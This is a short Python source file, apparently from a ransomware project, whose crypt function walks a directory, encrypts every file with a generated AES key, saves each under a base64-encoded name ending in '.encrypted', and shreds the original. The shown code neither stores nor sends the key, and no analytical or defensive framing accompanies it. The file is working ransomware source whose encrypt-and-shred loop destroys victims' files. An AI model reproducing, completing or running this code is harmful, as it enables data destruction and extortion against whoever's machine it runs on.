import os
import files
import utils
import base64
from ransom.asymmetric import AESCipher
from ransom.generate_keys import generate_key


def crypt(dir_path):
    key = generate_key(64)
    cipher = AESCipher(key)

    for file_path in files.find_files(dir_path):
        splitted_path = str(file_path).split('/')
        content = open(file_path, 'rb').read()
        print(content)

        encrypted_content = cipher.encrypt(content)
        # Must be substring cuz parsing error from binary to string
        new_file_location = os.path.join('/'.join(splitted_path[:-1]),
        base64.b64encode(bytes(splitted_path[-1], encoding='utf-8')).decode('utf-8') + '.encrypted')[2:]
    
        with open(new_file_location, 'wb') as f:
            f.write(encrypted_content)

        utils.shred(file_path)
